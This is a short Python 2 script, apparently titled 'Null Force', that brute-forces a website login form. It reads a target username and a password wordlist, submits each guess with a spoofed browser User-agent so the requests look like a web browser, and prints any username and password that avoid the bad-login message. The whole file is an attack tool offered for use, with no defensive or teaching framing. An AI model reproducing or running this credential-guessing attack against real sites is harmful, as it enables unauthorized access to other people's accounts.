##########################################
# This is for the Null Force
##########################################

def nullforce():
    #Global vars
    host = raw_input('Login form action URL:')
    usr = raw_input('Username/email to hax:')
    wl = raw_input('File path to wordlist:')
    badLogin = raw_input('What the page source throws for bad logins, this can be a partial word:')
    #Wordlist vars
    words = open(wl, "r").readlines()
    print "[+] Words loaded:", len(words)

    for word in words:
        word = word.replace("\n","")##This will remove newlines.
        loginSequence = [##Mimics web form.
                         ('username', usr),##Name field name. Change if something else.
                         ('password', word)]##Password field name. Change if named something else.
        loginData = urllib.urlencode(loginSequence)##Encode the data using urllib.
        opener = urllib2.build_opener(host)##Create an opener from the "host" variable.
        opener.addheaders = [('User-agent', 'Mozilla/5.0')]##Add a user-agent so we look like a web browser.
        source = opener.open(host, loginData).read()##Get the source from the site using our form. 
        if re.search(badLogin,source) == None:##If the source doesn't have badLogin var true, hacked.
            print "Successful Login:",usr, word
